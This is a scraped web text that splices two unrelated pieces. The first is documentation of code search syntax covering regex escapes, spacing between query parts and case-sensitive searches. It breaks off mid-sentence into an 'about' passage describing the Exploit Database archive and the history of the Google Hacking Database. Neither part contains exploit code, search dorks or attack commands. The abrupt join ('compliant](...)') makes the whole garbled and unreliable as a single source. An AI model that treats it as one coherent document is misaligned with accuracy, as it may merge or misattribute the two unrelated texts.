Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
